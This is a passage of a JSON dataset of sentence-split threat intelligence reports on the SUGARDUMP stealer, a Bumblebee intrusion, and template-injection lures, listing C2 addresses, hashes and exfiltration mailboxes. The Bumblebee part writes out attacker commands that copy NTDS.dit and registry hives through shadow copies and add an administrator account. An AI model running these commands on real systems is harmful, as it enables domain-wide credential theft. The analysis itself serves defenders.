        "text": "Since this is a rather generic PDB path, this similarity may be circumstantial, and we consider it a weak link.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S61",
        "text": "- C:\\Users\\User\\Desktop\\sourc\\Chrome-Password-Recovery-master\\Chrome-Password-Recovery-master\\obj\\Debug\\ChromeRecovery.pdb",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S62",
        "text": "SUGARDUMP using SMTP for C2 communication \u2013 dated to late 2021-early 2022.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S63",
        "text": "This variant was downloaded from a known UNC3890 C2 (URL: hxxp://128.199.6[.]246/3-Video-VLC.exe), and is a slightly more advanced version with similar credential harvesting functionality.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S64",
        "text": "The downloaded file \u201c3-Video-VLC.exe\u201d (MD5: ae0a16b6feddd53d1d52ff50d85a42d5) is a Windows installer which, upon execution, drops and executes two files under the path %AppData%\\\\Roaming\\\\:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S65",
        "text": "- CrashReporter.exe (MD5: 084ad50044d6650f9ed314e99351a608) \u2013 a browser credential harvesting tool (SUGARDUMP).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S66",
        "text": "- RealDo1080.mp4 (MD5: d8fb3b6f5681cf5eec2b89be9b632b05) \u2013 a social engineering video, played using Windows Media Player while CrashReporter.exe is executed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S67",
        "text": "The video contains a commercial for AI-driven robotic dolls.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S68",
        "text": "Upon first execution, CrashReporter.exe (SUGARDUMP) attempts to locate the folder: %AppData%\\\\Microsoft\\\\Edge\\\\User Data\\\\CrashPad\\\\\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S69",
        "text": "If it wasn\u2019t found it will search for folder: %AppData%\\\\Microsoft\\\\Internet Explorer\\\\TabRoaming\\\\",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S70",
        "text": "If the latter folder is not found as well, the malware proceeds to create it.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S71",
        "text": "The malware will then copy itself into \u201cTabRoaming\u201d folder again under the name \u201cCrashReporter.exe\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S72",
        "text": "Subsequently, a scheduled task is created, which ensures the persistence of this version of SUGARDUMP:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S73",
        "text": "- In Windows 7 the scheduled task is called: \"MicrosoftInternetExplorerCrashRepoeterTaskMachineUA\", and contains the description \"Keep your Microsoft software without any bugs.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S74",
        "text": "If this task is disabled or stopped, your Microsoft software may not work properly, meaning bugs that may arise cannot be fixed and features may not work.\u201d\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S75",
        "text": "- In other Windows OS versions the scheduled task is called: \"MicrosoftEdgeCrashRepoeterTaskMachineUA\", and contains the description \u201cKeep your Microsoft software without any bugs.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S76",
        "text": "If this task is disabled or stopped, your Edge browser may not work properly, meaning bugs that may arise cannot be fixed and features may not work.\u201d\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S77",
        "text": "The scheduled task is configured to execute CrashReporter.exe during user logon.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S78",
        "text": "The malware then attempts to connect to \u201csmtp.yandex.com\u201d and \u201csmtp.mail.yahoo.com\u201d via port 587.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S79",
        "text": "If the attempt is successful, the malware starts to harvest bowser related information on the host.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S80",
        "text": "This version of SUGARDUMP harvest credentials from the following browsers:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S81",
        "text": "- Firefox (added functionality with relation to the previous version )",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S82",
        "text": "- Chrome\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S83",
        "text": "- Opera\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S84",
        "text": "- Edge",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S85",
        "text": "For each browser the malware attempts to extract login credentials from the following paths:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S86",
        "text": "- %Appdata%\\\\Mozilla\\\\Firefox\\\\Profiles",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S87",
        "text": "- %Appdata%\\\\Google\\\\Chrome\\\\User Data",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S88",
        "text": "- %Appdata%\\\\Opera Software\\\\Opera Stable",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S89",
        "text": "- %Appdata%\\\\Microsoft\\\\Edge\\\\User Data",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S90",
        "text": "This version of SUGARDUMP also extracts the browser\u2019s version, browsing history, bookmarks, and cookies.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S91",
        "text": "The extracted data structure looks as follows:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S92",
        "text": "The collected data is subsequently encoded using base64 and stored under: %<malware_execution_folder>%\\\\CrashLog.txt",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S93",
        "text": "The malware will then send the file \u201cCrashLog.txt\u201d via email, by connecting and sending it from one of the two following email addresses:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S94",
        "text": "- john.macperson2021@yandex[.]com",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S95",
        "text": "- john.macperson2021@yahoo[.]com",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S96",
        "text": "The email is sent to one of these four email addresses:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S97",
        "text": "- john.macperson2021@yandex[.]com",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S98",
        "text": "- john.macperson2021@yahoo[.]com",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S99",
        "text": "- john.macperson2021@gmail[.]com",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S100",
        "text": "- john.macperson@protonmail[.]com",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S101",
        "text": "The subject for each message would be \u201cVLC Player\u201d, with \u201cCrashLog.txt\u201d attached.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S102",
        "text": "If SUGARDUMP fails to send the message, it creates a new file under: %<malware_current_execution_path>%\\\\CrashLogName.txt, and writes to the file the error details.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S103",
        "text": "\"CrashLogName.txt\" is also sent via email, using the same method mentioned above.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S104",
        "text": "Afterwards, the malware terminates its execution.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S105",
        "text": "SUGARDUMP using HTTP for C2 communication \u2013 dated to April 2022, this version sends the stolen credentials to an UNC3890 C2 server (144.202.123[.]248:80).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S106",
        "text": "We observed this version dropped by a .xls file which contains a fake job offer to a software developer position in NexisLexis, a data analytics platform (MD5: 639f83fa4265ddbb43e85b763fe3dbac).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S107",
        "text": "The .xls file contains a Macro, which upon enablement attempts to execute an embedded PE file using RunDLL (MD5: e125ed072fc4529687d98cf4c62e283e).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S108",
        "text": "The PE file is the newest version of SUGARDUMP we observed so far.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S109",
        "text": "Like previous versions, this version of SUGARDUMP harvests credentials from Chromium-based browsers Chrome, Opera and Edge.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S110",
        "text": "The data is saved in a new file under %TEMP%\\\\DebugLogWindowsDefender.txt.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S111",
        "text": "The collected data is subsequently encrypted using AES encryption using Cipher Block Chaining (CBC) mode.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S112",
        "text": "The encryption key is the Sha256 of an embedded password: \u201c1qazXSW@3edc123456be name KHODA 110 !!)1qazXSW@3edc\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S113",
        "text": "The word \u201cKHODA\u201d means god in Farsi.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S114",
        "text": "After the encryption process, the data is also encoded using Base64, and subsequently sent over HTTP to an UNC3890 C2 server: 144.202.123[.]248:80.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S115",
        "text": "The .NET project for this version of SUGARDUMP was named \"yaal\", which is the Farsi word for a horse\u2019s mane.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S116",
        "text": "This, along with the use of the word \u201cKHODA\u201d in SUGARDUMP\u2019s encryption key, may strengthen the possibility that the developers of SUGARDUMP are Farsi speakers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S117",
        "text": "SUGARDUMP Samples:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S118",
        "text": "- f362a2d9194a09eaca7d2fa04d89e1e5 \u2013 early version",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S119",
        "text": "- 08dc5c2af21ecee6f2b25ebdd02a9079 \u2013 early version",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S120",
        "text": "- ae0a16b6feddd53d1d52ff50d85a42d5 \u2013 SMTP-based version",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S121",
        "text": "- e125ed072fc4529687d98cf4c62e283e \u2013 HTTP-based version",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S0",
        "text": "Cybereason GSOC team observed the following distribution method to deliver the Bumblebee malware:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S1",
        "text": "- A spear phishing email is received containing an archive or a link to an external source to download the archive.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S2",
        "text": "- User extracts the archive and mounts the resulting ISO image.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S3",
        "text": "- The content of the mounted ISO image is a LNK file executing the Bumblebee payload upon user interaction:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S4",
        "text": "Bumblebee operators host malicious websites that implement a drive-by download.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S5",
        "text": "To infect the system, an end-user has to first manually decompress the archive containing the ISO file, mount the file and then execute the Windows shortcut (LNK).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S6",
        "text": "The LNK file has an embedded command to run Bumblebee Dynamic-link library (DLL) using odbcconf.exe Living Off the Land Binary (LOLBin) and response (.rsp) file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S7",
        "text": "The file [Bumblebee specific name].rsp has the reference to the Bumblebee DLL:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S8",
        "text": "Odbcconf.exe loadsBumblebee DLL with the internal name LdrAddx64.dll",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S9",
        "text": ".",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S10",
        "text": "The figure below illustrates the ISO image content (DLL, RSP and LNK files) for Bumblebee:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S11",
        "text": "Bumblebee DLL is executed using odbcconf.exe -f [Bumblebee specific name].rsp in the LNK file target property.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S12",
        "text": "[Bumblebee specific name].rsp has a reference to [Bumblebee specific name].dll which is the Bumblebee payload\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S13",
        "text": "After the initial infection, Bumblebee injects code into multiple processes in order to establish a strong foothold on infected endpoints.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S14",
        "text": "The process odbcconf.exe creates local Windows Management Instrumentation (WMI) calls to spawn new processes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S15",
        "text": "As a result, the following two processes are spawned from wmiprivse.exe (Windows Management Instrumentation Provider Service) :",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S16",
        "text": "- wabmig.exe (Microsoft contacts import tool) with injected Meterpreter agent code (Meterpreter agent is a security product used for penetration testing and provides remote control capabilities).\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S17",
        "text": "- wab.exe (Microsoft address book application) with an injected Cobalt Strike beacon:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S18",
        "text": "Bumblebee performs privilege escalation by loading an exploit for CVE-2020-1472 (Zerologon) into rundll32.exe:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S19",
        "text": "Bumblebee uses a User Account Control (UAC) bypass technique to deploy post exploitation tools with elevated privileges on infected machines.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S20",
        "text": "The method uses fodhelper.exe which is a trusted binary, meaning Windows 10 won't show a UAC window when launched into execution:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S21",
        "text": "Fodhelper.exe is used to run \"cmd.exe\" /c rundll32.exe C:\\ProgramData\\Cisco\\[Cobalt strike].dll\u201d,MainProc where [Cobalt strike].dll is a Cobalt Strike framework beacon and MainProc is the exported function to run.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S22",
        "text": "Cobalt Strike is an adversary simulation framework with the primary use case of assisting red team operations.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S23",
        "text": "However, Cobalt Strike is also actively used by malicious actors for conducting post-intrusion malicious activities.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S24",
        "text": "Cobalt Strike is a modular framework with an extensive set of features that are useful to malicious actors, such as command execution, process injection, and credential theft.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S25",
        "text": "After obtaining system privileges on the infected machine, Bumblebee performs credential theft using two methods detailed below.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S26",
        "text": "First method used is Local Security Authority Subsystem Service (LSASS) process memory dump.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S27",
        "text": "On Windows systems domain, local usernames and passwords are stored in the memory space of the LSASS process.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S28",
        "text": "Bumblebee dumps the memory of this process using procdump64.exe to access the sensitive information:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S29",
        "text": "The second method of credential theft that Bumblebee operators use is registry hive extraction using reg.exe:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S30",
        "text": "- HKLM SAM:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S31",
        "text": "The Security Account Manager (SAM) database is where Windows stores information about user accounts.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S32",
        "text": "- HKLM Security: Local Security Authority (LSA) stores user logins and their LSA secrets.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S33",
        "text": "- HKLM System: Contains keys that could be used to decrypt/encrypt the LSA secret and SAM database:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S34",
        "text": "Bumblebee operators :\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S35",
        "text": "- Obtain registry dumps",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S36",
        "text": "- Compress the data",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S37",
        "text": "- Exfiltrate it over their network tunnel:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S38",
        "text": "Bumblebee operators process retrieved credentials offline, attempting to extract cleartext passwords.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S39",
        "text": "The time between credentials theft and the next activity is approximately 3 hours.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S40",
        "text": "After the attackers gain a foothold in the organization network, they gather information in various ways.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S41",
        "text": "We have observed attackers using tools such as nltest, ping, netview, tasklist and Adfind to collect wide information related to the organization.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S42",
        "text": "The attackers collect information such as the domain names, users, hosts and domain controllers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S43",
        "text": "AdFind (named \u201caf.exe\u201d) is a publicly available tool for querying Active Directory and has been used by multiple threat actors:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S44",
        "text": "During the reconnaissance phase, Bumblebee operators contacted more than 200 IP addresses and domain names within the organization.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S45",
        "text": "The most notable ones are Microsoft Exchange, Windows Server Update Services (WSUS) servers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S46",
        "text": "The following table summarizes the reconnaissance commands observed by Cybereason GSOC analysts:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S47",
        "text": "Bumblebee uses a Cobalt Strike agent for lateral movement.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S48",
        "text": "We can see multiple connections from the process to internal addresses on Remote Desktop Protocol (RDP), on TCP port 3389:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S49",
        "text": "Following the lateral movement, the attacker persists on the organization network using the remote management software \u201cany desk\u201d:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S50",
        "text": "Bumblebee operators using Anydesk for lateral movement as seen in the Cybereason Defense Platform\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S51",
        "text": "After the attacker obtains a highly privileged user and its password, the attacker accesses the shadow copy.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S52",
        "text": "Shadow Copy is a technology included in Microsoft Windows that can create backup copies or snapshots of computer files or volumes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S53",
        "text": "Bumblebee accesses the remote Active Directory machines using Windows Management Instrumentation command-line utility (WMIC) and creates a shadow copy using vssadmin command.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S54",
        "text": "In addition, the attacker steals the ntds.dit file from the domain controller.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S55",
        "text": "The ntds.dit file is a database that stores Active Directory data, including information about user objects, groups and group membership.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S56",
        "text": "The file also stores the password hashes for all users in the domain:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S57",
        "text": "The following are the commands related to credential theft used to escalate privileges on the Active Directory:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S58",
        "text": "- \u200b\u200bwmic /node:\"[Active Directory IP address]\" /user:\"[Compromised user name]\" /password:\"[Compromised user password]\" process call create \"cmd /c vssadmin create shadow /for=C: 2>&1\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S59",
        "text": "- wmic /node:\"[Active Directory IP address]\" /user:\"[Compromised user name]\" /password:\"[Compromised user password]\" process call create \"cmd /c vssadmin list shadows >> c:\\log.txt\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S60",
        "text": "- type \\\\[Active Directory IP address]\\c$\\log.txt\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S61",
        "text": "- wmic /node:\"[Active Directory IP address]\" /user:\"[Compromised user name]\" /password:\"[Compromised user password]\" process call create \"cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy635\\Windows\\NTDS\\NTDS.dit c:\\ProgramDatat & copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy635\\Windows\\System32\\config\\SYSTEM c:\\ProgramDatat & copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy635\\Windows\\System32\\config\\SECURITY c:\\ProgramDatat\"\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S62",
        "text": "- 7za.exe a -mx3 nt.7z \\\\[Active Directory IP address]\\c$\\ProgramData",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S63",
        "text": "In order to obtain maximum privileges on the Active Directory domain, the threat actor:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S64",
        "text": "- Creates a shadow copy of the machine file\u2019s volume",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S65",
        "text": "- Lists all available shadow copies and stored the result in a file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S66",
        "text": "- Copies the Active Directory database (ntds.dit) as well as registry hives containing credentials and sensitive data from the shadow copy.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S67",
        "text": "- Compress the output directory for exfiltration.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S68",
        "text": "The threat actor uses a domain administrator account obtained previously to move laterally on multiple systems.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S69",
        "text": "After initial connection, they create a local user and exfiltrate data using Rclone software.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S70",
        "text": "User creation commands are as follows :",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S71",
        "text": "- net user [Attacker created username] P@ssw0rd!1 /add",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S72",
        "text": "- net localgroup Administrators [Attacker created username] /add",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S73",
        "text": "The rclone.exe process transfers approximately 50 GB of data to an endpoint with an IP address over TCP port 22 (SSH), which is located in the United States.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S0",
        "text": "This recent campaign used malicious documents to install malware on the targeted system using a template injection attack.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S1",
        "text": "This technique allows a weaponized document to download an external Word template containing macros that will be executed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S2",
        "text": "This is a known trick used to bypass static malicious document analysis, as well as detection, as the macros are embedded in the downloaded template.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S3",
        "text": "Further, these malicious Word documents contained content related to legitimate jobs at these leading defense contractors.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S4",
        "text": "All three organizations have active defense contracts of varying size and scope with the US government.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S5",
        "text": "The timeline for these documents, that were sent to an unknown number of targets, ran between 31 March and 18 May 2020.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S6",
        "text": "Malign documents were the main entry point for introducing malicious code into the victim\u2019s environment.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S7",
        "text": "These documents contained job descriptions from defense, aerospace and other sectors as a lure.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S8",
        "text": "The objective would be to send these documents to a victim\u2019s email with the intention they open, view and ultimately execute the payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S9",
        "text": "As we mentioned, the adversary used a technique called template injection.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S10",
        "text": "When a document contains the .docx extension, in our case, it means that we are dealing with the Open Office XML standard.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S11",
        "text": "A .docx file is a zip file containing multiple parts.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S12",
        "text": "Using the template injection technique, the adversary puts a link towards the template file in one of the .XML files, for example the link is in settings.xml.rels while the external oleobject load is in document.xml.rels.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S13",
        "text": "The link will load a template file (DOTM) from a remote server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S14",
        "text": "This is a clever technique we observe being used by multiple adversaries [5] and is intended to make a document appear to be clean initially, only to subsequently load malware.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S15",
        "text": "Some of these template files are renamed as JPEG files when hosted on a remote server to avoid any suspicion and bypass detection.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S16",
        "text": "These template files contain Visual Basic macro code, that will load a DLL implant onto the victim\u2019s system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S17",
        "text": "Current McAfee technologies currently protect against this threat.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S18",
        "text": "We mentioned earlier that docx files (like xlsx and pptx) are part of the OOXML standard.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S19",
        "text": "The document defining this standard[6], describes the syntax and values that can be used as an example.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S20",
        "text": "An interesting file to look at is the \u2018settings.xml\u2019 file that can be discovered in the \u2018Word\u2019 container of the docx zip file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S21",
        "text": "This file contains settings with regards to language, markup and more.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S22",
        "text": "First, we extracted all the data from the settings.xml files and started to compare.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S23",
        "text": "All the documents below contained the same language values:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S24",
        "text": "The XML file ends with a GUID value that starts with the value \u201cw15\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S25",
        "text": "According to the Microsoft documentation, w15 defines the PersistentDocumentId Class.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S26",
        "text": "When the object is serialized out as xml, its qualified name is w15:docId.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S27",
        "text": "The 128-bit GUID is set as an ST_Guid attribute which, according to the Microsoft documentation, refers to a unique token.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S28",
        "text": "The used class generates a GUID for use as the DocID and generates the associated key.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S29",
        "text": "The client stores the GUID in that structure and persists in the doc file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S30",
        "text": "If, for example, we would create a document and would \u201cSave As\u201d, the w15:docId GUID would persist across to the newly created document.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S31",
        "text": "What would that mean for our list above?",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S32",
        "text": "Documents with the same GUID value need to be placed in chronological order and then we can state the earliest document is the root for the rest, for example:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S33",
        "text": "What we can say from above table is that \u2018_IFG_536R.docx\u201d was the first document we observed and that later documents with the same docID value were created from the same base document.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S34",
        "text": "To add to this assertion; in the settings.xml file the value \u201crsid\u201d (Revision Identifier for Style Definition) can be found.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S35",
        "text": "According to Microsoft\u2019s documentation: \u201cThis element specifies a unique four-digit number which shall be used to determine the editing session in which this style definition was last modified.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S36",
        "text": "This value shall follow this following constraint: All document elements which specify the same rsid* values shall correspond to changes made during the same editing session.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S37",
        "text": "An editing session is defined as the period of editing which takes place between any two subsequent save actions.\u201d\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S38",
        "text": "Let\u2019s start with the rsid element values from \u201c*_IFG_536R.docx\u201d:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S39",
        "text": "And compare with the rsid element values from \u201c*_PMS.docx\u201d:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S40",
        "text": "The rsid elements are identical for the first four editing sessions for both documents.",
        "type": ""
    },
    {
